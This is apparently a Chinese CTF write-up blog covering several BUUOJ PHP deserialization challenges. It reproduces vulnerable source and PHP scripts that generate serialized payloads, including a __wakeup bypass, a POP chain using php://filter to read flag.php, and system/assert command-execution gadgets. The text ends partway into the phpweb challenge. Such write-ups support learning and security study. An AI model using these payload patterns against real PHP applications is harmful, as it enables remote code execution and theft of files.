    <content><![CDATA[<p>[极客大挑战 2019]PHP	[MRCTF2020]Ezpop	[NPUCTF2020]ReadlezPHP	[网鼎杯 2020 青龙组]AreUSerialz	[网鼎杯 2020 朱雀组]phpweb	[安洵杯 2019]easy_serialize_php	[SWPUCTF 2018]SimplePHP	[极客大挑战 2020]Greatphp</p>
<span id="more"></span>

<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>1.查看源代码可什么都查不到，然后就去找了wp看可以使用dirsearch扫描到<a href="http://www.zip,然后就直接拿来使用在网址那输入`http//45e628f4-5673-4a23-b03a-8a245b9328ee.node4.buuoj.cn:81/www.zip%60%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E8%BF%99%E9%81%93%E9%A2%98%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81">www.zip，然后就直接拿来使用在网址那输入`http://45e628f4-5673-4a23-b03a-8a245b9328ee.node4.buuoj.cn:81/www.zip`然后下载了一个文件，里面有这道题的源代码</a></p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#x27;class.php&#x27;;</span><br><span class="line">    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>3.感觉重要的就这两个文件，其实还有一个flag.php文件，但里面的flag是假的，然后在index.php看到了反序列化函数，可以用select传参，在class.php文件中知道了我们需要让username等于admin，让password等于100，才可以让echo $flag;执行</p>
<p>4.同时又看到了__wakeup()魔术方法，需要绕过它，否则username就会被赋值为guest</p>
<p>5.根据这些来构造payload，使用php来将需要的先序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name();</span><br><span class="line">print_r(serialize($a));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>6.因为url无法解析”所以用%22代替，因为Name后面和前面都有空，空就用%00代替</p>
<p>7.payload就成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:%22Name%22:2:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;&#125;</span><br></pre></td></tr></table></figure>

<p>8.还需要绕过__wakeup()，最后payload就成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>1.打开页面显示源代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.根据提示知道flag在flag.php中，所以先找能打开文件的函数，发现在Modifier类中的include函数可以打开文件</p>
<p>3.我们可以控制的是pop参数，使用反序列化时，<code>__wakeup</code>会自动使用，其中的<code>prag_match</code>可以正则匹配，将$this-&gt;source当做字符串使用，此时<code>__toString</code>方法会自动调用，看<code>$this-&gt;str-&gt;source</code>，如果source为空就会自动调用<code>__get</code>方法，该方法中的<code>$function = $this-&gt;p;return $function();</code>将属性当做函数使用会自动调用<code>__invoke</code>，从而就可以使用include函数</p>
<p>4.这就是这个题的思路，但构造payload时尝试了多次都无法回显flag.php，看wp，发现需要使用php伪协议，但依然不会构造payload，直接看wp怎么来写php来构造的，看完还是有点不太懂</p>
<p>5.使用php构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">$show = new Show();</span><br><span class="line">$show-&gt;source = new Show();</span><br><span class="line">$show-&gt;source-&gt;str = new Test();</span><br><span class="line">$show-&gt;source-&gt;str-&gt;p = new Modifier();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($show));</span><br><span class="line">输出</span><br><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>6.这样会输出flag.php的base64编码，使用解码得到flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>1.打开网页后什么都没有显示，然后去寻找源代码，发现</p>
<p>![](.&#x2F;hello-world&#x2F;image-20221120145057014 - 副本.png)</p>
<p>2.点击<a href="http://e6088c9b-34a2-41da-b9cc-dcd6aacb32c7.node4.buuoj.cn:81/time.php?source">.&#x2F;time.php?source</a>，显示出此题的源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>3.观察使用source起不了作用，传参data可以使用反序列化，然后会自动调用__destruct()方法，观察到该方法中的<code>echo $b($a)</code>，想到如果$b是system，$a是cat &#x2F;flag.php，那么就变成了echo system(cat &#x2F;flag.php)，这样就可以得到flag了</p>
<p>4.使用php构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp&#123;</span><br><span class="line">    public $a=&quot;cat /flag.php&quot;;</span><br><span class="line">    public $b=&quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$e = new HelloPhp;</span><br><span class="line">echo urlencode(serialize($e));</span><br><span class="line">输出</span><br><span class="line">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22cat+%2Fflag.php%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>但是并没有什么用，于是看wp，发现system不能使用，需要使用assert，并且也不是使用cat &#x2F;flag.php，而是phpinfo()，于是再次构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp&#123;</span><br><span class="line">    public $a=&quot;phpinfo()&quot;;</span><br><span class="line">    public $b=&quot;assert&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$e = new HelloPhp;</span><br><span class="line">echo urlencode(serialize($e));</span><br><span class="line">输出</span><br><span class="line">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo%28%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>5.这样正确得到了php的版本<img src="/2022/12/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/image-2022112015000.png"></p>
<p>6.使用ctrl+F查找flag，于是查找到了flag</p>
<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>1.打开显示该题的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.首先观察到可以利用的是str，传参str后，is_valid($s)函数会检查没一个的ascii值是否在32和125之间，在的话就显示ture，不在就是flase</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果显示true，将会进行反序列化，然后__destruct()函数会自动调用，如果变量op类型是字符串，值为2，就会给op赋值为”1”，content赋值为空，进行process()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看process()函数，如果只要op的数值等于1，就会调用write()函数，只要op的数值等于2，就会调用read()函数，然后再调用output函数，如果都不等于就会返回Bad Hacker!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过看write函数，发现并不能使用来执行自己所需的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>read函数，可以给$res传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3.思路</p>
<p>给str传参，然后调用__destruct()函数，再调用process()函数，然后调用read()函数，利用filename变量，赋值给$res然后执行output()函数，执行echo $s;</p>
<p>4.写payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler</span><br><span class="line">&#123;</span><br><span class="line">    public $op=2;</span><br><span class="line">    public $filename=&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=new FileHandler();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">输出</span><br><span class="line">O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>5.再url处写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O%3A11%3A&quot;FileHandler&quot;%3A3%3A%7Bs%3A2%3A&quot;op&quot;%3Bi%3A2%3Bs%3A8%3A&quot;filename&quot;%3Bs%3A59%3A&quot;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php&quot;%3Bs%3A7%3A&quot;content&quot;%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>6.得到base64编码，进行解码得到flag</p>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>1.刚打开网页看到有一段<strong>Warning</strong>，大概翻译是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">依赖系统的时区设置是不安全的。您需要使用 date.timezone 设置或 date_default_timezone_set（） 函数。如果您使用了其中任何一种方法，但仍然收到此警告，则很可能拼写错了时区标识符。我们目前选择了时区“UTC”，但请设置 date.timezone 以选择您的时区。</span><br></pre></td></tr></table></figure>

<p>2.还以为需要利用date.timezone来解题呢，用了半天并没有什么卵用</p>
<p>3.然后看wp，可以使用burp进行抓包，抓包后发现可以传参func和p，然后传func&#x3D;file_get_contents&amp;p&#x3D;index.php发现得到了源代码</p>
